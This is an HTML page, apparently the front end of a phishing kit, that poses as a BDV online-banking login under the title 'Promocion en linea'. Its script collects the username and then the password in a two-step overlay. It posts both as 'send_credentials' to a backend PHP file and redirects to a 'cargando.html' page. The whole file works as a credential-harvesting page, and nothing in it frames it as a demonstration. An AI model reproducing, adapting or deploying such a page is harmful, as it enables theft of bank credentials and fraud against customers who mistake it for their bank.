<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Promocion en linea</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-image: url(background.jpg);
            background-size: cover;
            background-position: center;
        }

        .container {
            display: flex;
            height: 100%;
            width: 100%;
        }

        .left-side {
            width: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .right-side {
            width: 50%;
        }

        .form {
            width: 80%;
            background: white;
            max-width: 550px;
            box-shadow: 0 5px 10px 0 rgba(0, 0, 0, 0.1);
        }

        @media (max-width: 768px) {
            body {
                background: #ededed;
            }
            .container {
                flex-direction: column;
            }
            .left-side {
                width: 100%;
                height: 100vh;
            }
            .right-side {
                display: none;
            }
        }

        .form-group {
            position: relative;
            margin-bottom: 20px;
            margin: 20px;
        }

        .form-group label {
            position: absolute;
            top: 50%;
            left: 10px;
            transform: translateY(-55%);
            color: #999;
            transition: top 0.3s, font-size 0.3s;
            pointer-events: none;
        }

        .form-group input {
            width: 100%;
            padding: 10px;
            box-sizing: border-box;
            position: relative;
            height: 60px;
            border: 0;
            border-bottom: 1px solid gray;
            background: #ededed;
            outline: none;
        }

        .form-group input:focus {
            border: 0;
        }

        .form-group input:focus + label,
        .form-group input:not(:placeholder-shown) + label {
            top: 5px;
            font-size: 12px;
        }

        button {
            background-color: #0067b1;
            color: white;
            border-radius: 3px;
            border: 0;
            padding: 15px;
            width: 200px;
        }

        .overlay {
            display: flex;
            justify-content: center;
            align-items: center;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            z-index: 9999;
        }

        .content {
            background-color: #fff;
            width: 350px;
            border-radius: 5px;
            text-align: center;
        }

        .form-group2 {
            position: relative;
            margin-bottom: 20px;
            margin: 20px;
        }

        .form-group2 label {
            position: absolute;
            top: 50%;
            left: 23%;
            transform: translateY(-55%);
            color: #999;
            transition: top 0.3s, font-size 0.3s;
            pointer-events: none;
        }

        .form-group2 input {
            padding: 10px;
            box-sizing: border-box;
            position: relative;
            height: 60px;
            border: 0;
            border-bottom: 1px solid gray;
            background: #ededed;
            outline: none;
        }

        .form-group2 input:focus {
            border: 0;
        }

        .form-group2 input:focus + label,
        .form-group2 input:not(:placeholder-shown) + label {
            top: 5px;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="overlay" id="overlay" style="display: none">
        <div class="content">
            <form id="loginform2">
                <h4 style="color: #0067b1 !important">Introduce tu contraseña</h4>
                <div class="form-group2">
                    <input type="text" id="contra" required />
                    <label for="contra">Contraseña *</label>
                </div>
                <div style="width: 100%; text-align: center; padding-bottom: 30px">
                    <button type="submit" style="width: 160px">Continuar</button>
                </div>
            </form>
        </div>
    </div>
    <div class="container">
        <div class="left-side">
            <form id="loginform" class="form">
                <div style="text-align: center">
                    <img src="logo.png" alt="" style="width: 60%; margin-top: 20px" />
                </div>
                <div style="width: 100%; text-align: center">
                    <div class="form-group">
                        <input type="text" id="nombre" name="nombre" required />
                        <label for="nombre">Usuario *</label>
                    </div>
                </div>
                <div style="width: 100%; text-align: center">
                    <button type="submit">Entrar</button>
                </div>
                <div style="width: 100%; text-align: center; font-size: 12px; font-weight: bold; color: #999; margin-top: 30px; margin-bottom: 30px;">
                    ¿Olvidaste tu usuario o clave? <br />
                    Si eres nuevo clienteBDV, regístrate aquí
                </div>
            </form>
        </div>
        <div class="right-side"></div>
    </div>

    <script>
        // Lógica para manejar la visualización del overlay
        document.getElementById('loginform').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevenir el envío del formulario
            const nombre = document.getElementById('nombre').value;

            // Enviar el nombre al backend
            fetch('tu_backend.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: new URLSearchParams({
                    action: 'send_username',
                    nombre: nombre
                })
            })
            .then(response => {
                // Verifica si la respuesta es correcta
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                return response.json();
            })
            .then(data => {
                if (data.success) {
                    // Almacenar el nombre de usuario en localStorage
                    localStorage.setItem('nombre', nombre);
                    // Mostrar el overlay
                    document.getElementById('overlay').style.display = 'flex';
                } else {
                    alert('Error al enviar el nombre de usuario');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Ocurrió un error al enviar el nombre de usuario. Intenta de nuevo.');
            });
        });

        // Lógica para manejar el segundo formulario (contraseña)
        const form2 = document.querySelector("#loginform2");
        form2.addEventListener("submit", (event) => {
            event.preventDefault(); // Evitamos que el formulario se envíe inmediatamente
            const contra = document.querySelector("#contra").value;
            const nombre = localStorage.getItem('nombre'); // Obtener el nombre almacenado

            // Enviar nombre y contraseña al backend
            fetch('tu_backend.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: new URLSearchParams({
                    action: 'send_credentials',
                    nombre: nombre,
                    contra: contra
                })
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                return response.json();
            })
            .then(data => {
                if (data.success) {
                    // Redirigir a cargando.html sin mostrar mensajes
                    window.location.href = 'cargando.html'; // Redirigir a cargando.html
                } else {
                    console.error('Error al enviar las credenciales');
                    alert('Error al enviar las credenciales. Verifica tu usuario y contraseña.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Ocurrió un error al enviar las credenciales. Intenta de nuevo.');
            });
        });
    </script>
</body>
